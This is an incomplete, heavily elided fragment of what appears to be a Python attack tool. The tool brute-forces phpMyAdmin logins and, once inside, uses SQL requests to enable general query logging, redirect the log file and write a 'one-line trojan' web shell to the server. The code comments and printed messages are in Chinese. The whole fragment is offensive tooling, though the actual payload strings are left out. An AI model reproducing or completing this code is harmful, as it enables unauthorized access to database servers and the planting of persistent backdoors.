...
async def phpmyadmin_crack(session, host, username, password, limit):
    """phpmyadmin密码爆破"""
    # 超时
    # async with limit:
            ...
            if second_code != 302:
                ...
                if index_code == 200:
                    if "常规设置" in index_response:
                        ...
                        sql_log_on_code, sql_log_on_response = await handle_request(session=session,
                                                                                    url=sql_url, method="POST",
                                                                                    data=sql_data)
                        ...
                        sql_log_path_code, sql_log_path_response = await handle_request(session=session,
                                                                                        url=sql_url,
                                                                                        method="POST",
                                                                                        data=sql_data)
                        ...
                        print("开始写入一句话木马")
                        trojan_code, trojan_response = await handle_request(session=session, url=sql_url,
                                                                            method="POST", data=sql_data)
                        if trojan_response:
                            if trojan_code == 200:
